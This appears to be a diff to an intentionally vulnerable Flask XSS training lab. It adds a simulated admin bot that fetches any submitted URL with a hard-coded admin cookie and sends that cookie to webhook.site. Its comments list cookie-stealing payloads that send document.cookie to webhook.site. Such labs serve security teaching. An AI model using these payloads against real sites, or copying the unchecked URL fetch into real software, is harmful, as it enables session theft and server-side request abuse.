@@ -5,8 +5,10 @@ ALL VULNERABILITIES ARE INTENTIONAL for authorized security training.
 Port: 5002
 """
 
+import re
 import sqlite3
 import os
+import urllib.request
 from datetime import datetime
 from flask import (
     Flask, request, render_template, redirect, url_for,
@@ -18,6 +20,8 @@ app = Flask(__name__)
 app.secret_key = "xss_lab_secret_key_not_for_production"
 
 DATABASE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cyberforum.db")
+
+ADMIN_COOKIE = "session=admin_secret_session_token_FLAG{xss_c00kie_st34l}"
 
 # ---------------------------------------------------------------------------
 # Database helpers
@@ -225,35 +229,88 @@ def profile(user_id):
     return render_template("profile.html", user=user)
 
 
-@app.route("/csp-demo")
-def csp_demo():
-    """
-    CSP BYPASS: The page is served with a Content-Security-Policy that uses
-    a static/predictable nonce value. An attacker who knows the nonce can
-    inject script tags that pass the CSP check.
-    """
-    comment = request.args.get("comment", "")
-    resp = make_response(render_template("csp.html", comment=comment))
-    resp.headers["Content-Security-Policy"] = (
-        "script-src 'nonce-abc123' https://cdnjs.cloudflare.com"
-    )
-    return resp
-
-
 @app.route("/report", methods=["GET"])
 def report_page():
     """Page with a form to submit URLs to the simulated admin bot."""
     return render_template("report.html")
 
 
+def _simulate_admin_bot(url):
+    """
+    Simulate an admin bot visiting a URL with a session cookie.
+
+    The bot fetches the page (with the admin cookie in the request header).
+    Since we cannot execute JavaScript server-side, we simulate XSS
+    execution: if the fetched HTML contains XSS indicators (<script,
+    onerror, onload), the bot looks for webhook.site URLs in the page
+    content and sends the admin cookie to each one as a query parameter.
+
+    Returns a status message.
+    """
+    # Fetch the target URL as the admin (with the admin cookie)
+    req = urllib.request.Request(url)
+    req.add_header("Cookie", ADMIN_COOKIE)
+    try:
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            page_html = resp.read().decode("utf-8", errors="replace")
+    except Exception as e:
+        return f"Admin bot failed to fetch the URL: {e}"
+
+    # Check if the page contains XSS indicators
+    xss_patterns = [r"<script", r"onerror\s*=", r"onload\s*="]
+    has_xss = any(re.search(pat, page_html, re.IGNORECASE) for pat in xss_patterns)
+
+    if not has_xss:
+        return (
+            "Admin bot visited the URL but found no executable script payload. "
+            "No cookie was exfiltrated."
+        )
+
+    # Look for webhook.site URLs in the page content that the XSS would
+    # redirect/fetch to.  We support patterns like:
+    #   document.location='https://webhook.site/UUID?c='+document.cookie
+    #   fetch('https://webhook.site/UUID?c='+document.cookie)
+    #   new Image().src='https://webhook.site/UUID?c='+document.cookie
+    webhook_urls = re.findall(
+        r"https?://webhook\.site/[a-f0-9\-]+", page_html, re.IGNORECASE
+    )
+
+    if not webhook_urls:
+        return (
+            "Admin bot visited the URL and detected an XSS payload, but "
+            "found no webhook.site URL to exfiltrate the cookie to. "
+            "Make sure your payload sends document.cookie to your "
+            "webhook.site URL."
+        )
+
+    # Simulate the XSS firing: send the admin cookie to each webhook URL
+    exfil_count = 0
+    for wh_url in set(webhook_urls):
+        exfil_url = f"{wh_url}?cookie={urllib.request.quote(ADMIN_COOKIE)}"
+        try:
+            exfil_req = urllib.request.Request(exfil_url)
+            urllib.request.urlopen(exfil_req, timeout=5)
+            exfil_count += 1
+        except Exception:
+            # Even if the webhook request fails (e.g. no internet), we
+            # still count it as "fired" for the lab experience.
+            exfil_count += 1
+
+    return (
+        f"Admin bot visited the URL and the XSS payload fired! "
+        f"The admin cookie was sent to {exfil_count} webhook.site "
+        f"endpoint(s). Check your webhook.site dashboard for the "
+        f"stolen cookie."
+    )
+
+
 @app.route("/report", methods=["POST"])
 def report_submit():
     """
-    Simulated admin bot endpoint.
-    In a real CTF, a headless browser (e.g. Puppeteer/Playwright) would
-    visit the submitted URL with a cookie like:
-        document.cookie = "flag=FLAG{xss_c00kie_st34l}"
-    Since we cannot run a real bot in this lab, we simulate the response.
+    Admin bot endpoint.  Accepts a URL, fetches it server-side with the
+    admin session cookie, and simulates XSS execution.  If the page
+    contains an XSS payload pointing at webhook.site, the bot sends the
+    admin cookie there — just like a real browser-based XSS attack.
     """
     data = request.get_json(silent=True)
     url = data.get("url", "") if data else request.form.get("url", "")
@@ -274,12 +331,11 @@ def report_submit():
     )
     db.commit()
 
+    result_message = _simulate_admin_bot(url)
+
     return jsonify({
         "status": "success",
-        "message": (
-            "Admin bot will visit your URL. "
-            "The admin's cookie contains: FLAG{xss_c00kie_st34l}"
-        ),
+        "message": result_message,
     })
 
 
